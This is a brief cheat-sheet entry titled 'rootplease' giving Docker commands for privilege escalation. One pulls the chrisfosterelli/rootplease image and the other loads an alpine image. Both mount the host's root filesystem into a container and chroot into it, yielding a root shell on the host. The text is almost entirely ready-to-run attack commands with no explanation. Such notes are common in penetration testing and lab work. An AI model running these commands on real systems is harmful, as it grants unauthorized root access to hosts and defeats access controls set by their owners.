# rootplease
```text-plain
docker pull chrisfosterelli/rootplease
docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
```

For alpine:

```text-plain
docker save -o alpine.tar alpine
#upload alpine.tar to vm
docker load < alpine.tar  
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```